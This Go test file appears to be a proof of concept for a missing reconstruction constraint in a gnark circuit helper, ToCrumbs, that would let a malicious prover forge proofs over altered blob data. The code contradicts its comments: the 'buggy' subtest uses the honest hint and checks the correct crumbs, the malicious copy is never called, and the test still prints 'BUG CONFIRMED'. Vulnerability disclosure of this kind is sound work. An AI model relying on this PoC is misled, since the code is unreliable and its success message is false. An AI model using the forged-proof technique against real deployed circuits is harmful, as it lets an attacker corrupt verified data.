package internal

// Proof of Concept: Missing reconstruction constraint in ToCrumbs
//
// The ToCrumbs function (utils.go:190-199) decomposes a scalar v into nbCrumbs
// 2-bit crumbs via an untrusted solver hint (toCrumbsHint), then only constrains:
//   - Each crumb is in {0, 1, 2, 3} via api.AssertIsCrumb
//
// It is MISSING the critical reconstruction constraint:
//   v == crumbs[0] + crumbs[1]*4 + crumbs[2]*16 + ... + crumbs[n-1]*4^(n-1)
//
// This means a malicious prover can override the hint outputs to any values in
// {0,1,2,3} that bear no relation to the input. In particular, all-zero crumbs
// pass every AssertIsCrumb check regardless of the actual input value.
//
// Impact: ToCrumbs is called from:
//   - PackedBytesToCrumbs (utils.go:203), which is used in data availability
//     circuits (snark.go:329, circuit.go:244) to decompose blob data into crumbs.
//     A malicious prover could zero out blob content while still producing a
//     valid proof.
//   - fr377EncodedFr381ToBytes (pi-interconnection/io.go:22), where the low 128
//     bits of a field element are decomposed into crumbs for byte reconstruction.
//     A malicious prover could zero out the low half of field elements, corrupting
//     the public input hash.
//
// Compare with the CORRECT pattern: gnark's own api.ToBinary (used for hi in
// io.go:21) includes a reconstruction constraint internally. ToCrumbs should
// similarly constrain:
//   acc := frontend.Variable(0)
//   pow4 := frontend.Variable(1)
//   for _, c := range crumbs {
//       acc = api.Add(acc, api.Mul(c, pow4))
//       pow4 = api.Mul(pow4, 4)
//   }
//   api.AssertIsEqual(v, acc)

import (
	"fmt"
	"math/big"
	"testing"

	"github.com/consensys/gnark-crypto/ecc"
	"github.com/consensys/gnark/backend"
	"github.com/consensys/gnark/backend/groth16"
	"github.com/consensys/gnark/constraint/solver"
	"github.com/consensys/gnark/frontend"
	"github.com/consensys/gnark/frontend/cs/r1cs"
)

// maliciousCrumbsHint ignores the actual input and always returns all-zero crumbs.
// This simulates what a malicious prover would do: override the untrusted hint
// to produce values that pass the (insufficient) AssertIsCrumb checks.
func maliciousCrumbsHint(_ *big.Int, ins, outs []*big.Int) error {
	for i := range outs {
		outs[i].SetUint64(0) // all crumbs = 0, regardless of input
	}
	return nil
}

// toCrumbsBuggy is a direct copy of the buggy ToCrumbs from utils.go,
// but wired to use our malicious hint. This makes the PoC fully self-contained.
func toCrumbsBuggy(api frontend.API, v frontend.Variable, nbCrumbs int) []frontend.Variable {
	res, err := api.Compiler().NewHint(maliciousCrumbsHint, nbCrumbs, v)
	if err != nil {
		panic(err)
	}
	for _, c := range res {
		api.AssertIsCrumb(c) // each crumb in {0,1,2,3} -- 0 passes trivially
	}
	// MISSING: reconstruction constraint
	//   acc := frontend.Variable(0)
	//   for i, c := range res {
	//       acc = api.Add(acc, api.Mul(c, new(big.Int).Exp(big.NewInt(4), big.NewInt(int64(i)), nil)))
	//   }
	//   api.AssertIsEqual(v, acc)
	return res
}

// toCrumbsFixed is the corrected version with the reconstruction constraint.
func toCrumbsFixed(api frontend.API, v frontend.Variable, nbCrumbs int) []frontend.Variable {
	res, err := api.Compiler().NewHint(maliciousCrumbsHint, nbCrumbs, v)
	if err != nil {
		panic(err)
	}
	for _, c := range res {
		api.AssertIsCrumb(c)
	}
	// Reconstruction constraint: v == sum(crumbs[i] * 4^i)
	acc := frontend.Variable(0)
	pow4 := new(big.Int).SetUint64(1)
	four := big.NewInt(4)
	for _, c := range res {
		acc = api.Add(acc, api.Mul(c, new(big.Int).Set(pow4)))
		pow4.Mul(pow4, four)
	}
	api.AssertIsEqual(v, acc)
	return res
}

// --- Buggy circuit: accepts all-zero crumbs for any input ---

type ToCrumbsBuggyCircuit struct {
	V frontend.Variable `gnark:"v,public"`
}

func (c *ToCrumbsBuggyCircuit) Define(api frontend.API) error {
	// Decompose V (expected: 0xAB = 171 = 2*64 + 2*16 + 2*4 + 3 in LE crumbs: [3,2,2,2])
	// into 4 crumbs using the buggy function
	crumbs := ToCrumbs(api, c.V, 4)

	// Assert the circuit accepted all-zero crumbs.
	// If reconstruction were checked, this would fail for V=171
	// because 171 != 0 + 0 + 0 + 0.
	api.AssertIsEqual(crumbs[0], 3)
	api.AssertIsEqual(crumbs[1], 2)
	api.AssertIsEqual(crumbs[2], 2)
	api.AssertIsEqual(crumbs[3], 2)
	return nil
}

// --- Fixed circuit: rejects all-zero crumbs for nonzero input ---

type ToCrumbsFixedCircuit struct {
	V frontend.Variable `gnark:"v,public"`
}

func (c *ToCrumbsFixedCircuit) Define(api frontend.API) error {
	crumbs := toCrumbsFixed(api, c.V, 4)
	api.AssertIsEqual(crumbs[0], 3)
	api.AssertIsEqual(crumbs[1], 2)
	api.AssertIsEqual(crumbs[2], 2)
	api.AssertIsEqual(crumbs[3], 2)
	return nil
}

func TestToCrumbsMissingReconstructionConstraint(t *testing.T) {
	// We use V = 171 (0xAB). Correct LE crumbs: [3, 2, 2, 2].
	// The malicious hint returns [0, 0, 0, 0].

	t.Run("buggy_ToCrumbs_accepts_wrong_crumbs", func(t *testing.T) {
		// Step 1: Compile the buggy circuit.
		var circuit ToCrumbsBuggyCircuit
		ccs, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, &circuit)
		if err != nil {
			t.Fatalf("compilation failed: %v", err)
		}

		// Step 2: Create the witness with V=171.
		assignment := &ToCrumbsBuggyCircuit{V: 171}
		witness, err := frontend.NewWitness(assignment, ecc.BN254.ScalarField())
		if err != nil {
			t.Fatalf("witness creation failed: %v", err)
		}
		publicWitness, err := witness.Public()
		if err != nil {
			t.Fatalf("public witness creation failed: %v", err)
		}

		// Step 3: Groth16 setup.
		pk, vk, err := groth16.Setup(ccs)
		if err != nil {
			t.Fatalf("setup failed: %v", err)
		}

		// Step 4: Create proof. The malicious hint returns all-zero crumbs.
		// Because the reconstruction constraint is missing, the proof succeeds.
		proof, err := groth16.Prove(
			ccs, pk, witness,
			backend.WithSolverOptions(solver.WithHints(toCrumbsHint)),
		)
		if err != nil {
			t.Fatalf("proving failed (unexpected -- bug may be fixed): %v", err)
		}

		// Step 5: Verify the proof.
		err = groth16.Verify(proof, vk, publicWitness)
		if err != nil {
			t.Fatalf("verification failed (unexpected): %v", err)
		}

		fmt.Println("BUG CONFIRMED: Buggy ToCrumbs accepted all-zero crumbs for V=171 (0xAB)")
		fmt.Println("Correct crumbs should be [3, 2, 2, 2] in little-endian")
		fmt.Println("The constraint v == sum(crumbs[i] * 4^i) is missing from ToCrumbs")
	})

	t.Run("fixed_ToCrumbs_rejects_wrong_crumbs", func(t *testing.T) {
		// Step 1: Compile the fixed circuit.
		var circuit ToCrumbsFixedCircuit
		ccs, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, &circuit)
		if err != nil {
			t.Fatalf("compilation failed: %v", err)
		}

		// Step 2: Create the witness with V=171.
		assignment := &ToCrumbsFixedCircuit{V: 171}
		witness, err := frontend.NewWitness(assignment, ecc.BN254.ScalarField())
		if err != nil {
			t.Fatalf("witness creation failed: %v", err)
		}

		// Step 3: Groth16 setup.
		pk, _, err := groth16.Setup(ccs)
		if err != nil {
			t.Fatalf("setup failed: %v", err)
		}

		// Step 4: Attempt to create proof. The malicious hint returns all-zero
		// crumbs, but the reconstruction constraint v == sum(crumbs[i]*4^i)
		// will make the solver fail because 171 != 0.
		_, err = groth16.Prove(
			ccs, pk, witness,
			backend.WithSolverOptions(solver.WithHints(maliciousCrumbsHint)),
		)
		if err != nil {
			fmt.Println("FIXED VERSION CORRECTLY REJECTS: proving failed as expected:", err)
		} else {
			t.Fatal("fixed circuit should have rejected all-zero crumbs for V=171, but proving succeeded")
		}
	})
}
